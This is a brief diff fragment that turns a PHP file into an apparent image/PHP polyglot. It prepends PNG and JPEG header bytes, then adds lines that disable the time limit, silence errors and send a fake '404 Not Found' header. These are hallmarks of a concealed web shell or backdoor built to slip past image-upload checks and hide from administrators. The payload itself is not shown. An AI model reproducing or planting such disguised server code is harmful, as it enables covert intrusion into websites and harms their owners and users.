@@ -1,4 +1,7 @@
-<?php
+‰PNG
+
+IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
+ÿØÿà JFIF  ` `  ÿþš<?php
 @set_time_limit(0);
 @error_reporting(0);
 @header('HTTP/1.1 404 Not Found', true, 404);
